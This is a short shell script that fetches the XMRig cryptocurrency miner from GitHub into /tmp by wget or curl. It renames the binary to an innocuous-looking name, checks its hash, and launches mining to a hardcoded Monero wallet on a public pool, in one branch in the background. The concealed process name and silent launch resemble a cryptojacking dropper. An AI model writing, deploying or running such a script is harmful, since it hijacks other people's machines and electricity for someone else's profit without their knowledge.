#ATILA_VKZMN

md5_vkzmn='cf127d66124c390ca0f0b42c6385c3c8'



down_wget(){




wget https://github.com/xmrig/xmrig/releases/download/v6.25.0/xmrig-6.25.0-linux-static-x64.tar.gz -O  /tmp/xmrig-6.25.0-linux-static-x64.tar.gz
gzip -df /tmp/xmrig-6.25.0-linux-static-x64.tar.gz
tar -xf /tmp/xmrig-6.25.0-linux-static-x64.tar -C /tmp                                 

cd /tmp/xmrig-6.25.0 ;  mv xmrig  vkzmn 

md5=$(md5sum vkzmn)   

for m  in $md5 ; do

if   [ $m =  $md5_vkzmn ] ; then

echo xmrig conhecido


rm config.json

#use    #tls and por 9000    

./vkzmn  --url  pool.supportxmr.com:3333    --user  4Ary8uo817nZAjKXPtgRLf1XUVn1KXUp5WDBUrjDfctwGpirSoxKqBNRnRsgp7ha5vGxXD2u8maGMTezRzjaXrizTp2xYFy  --pass x --donate-level 1   &
 



#cd /tmp ; ./vkzmn  # teste  of script


fi;

done
}



down_curl(){



curl -L  https://github.com/xmrig/xmrig/releases/download/v6.25.0/xmrig-6.25.0-linux-static-x64.tar.gz -o  /tmp/xmrig-6.25.0-linux-static-x64.tar.gz
gzip -df /tmp/xmrig-6.25.0-linux-static-x64.tar.gz
tar -xf /tmp/xmrig-6.25.0-linux-static-x64.tar -C /tmp                              
cd /tmp/xmrig-6.25.0 ;  mv xmrig  vkzmn   


md5=$(md5sum vkzmn )

for m  in $md5 ; do

if [ $m =  $md5_vkzmn ] ; then


echo   xmrig conhecido

rm config.json

#use    #tls and por 9000  

./vkzmn   --url  pool.supportxmr.com:3333  --user  4Ary8uo817nZAjKXPtgRLf1XUVn1KXUp5WDBUrjDfctwGpirSoxKqBNRnRsgp7ha5vGxXD2u8maGMTezRzjaXrizTp2xYFy  --pass x --donate-level 1  
 


fi ; 

done

}







co=$(command -v wget)

shell_err=$(echo $?)

echo $shel_err


if [ $shell_err -eq 0 ] ; then 


down_wget


else 


down_curl


fi ; 




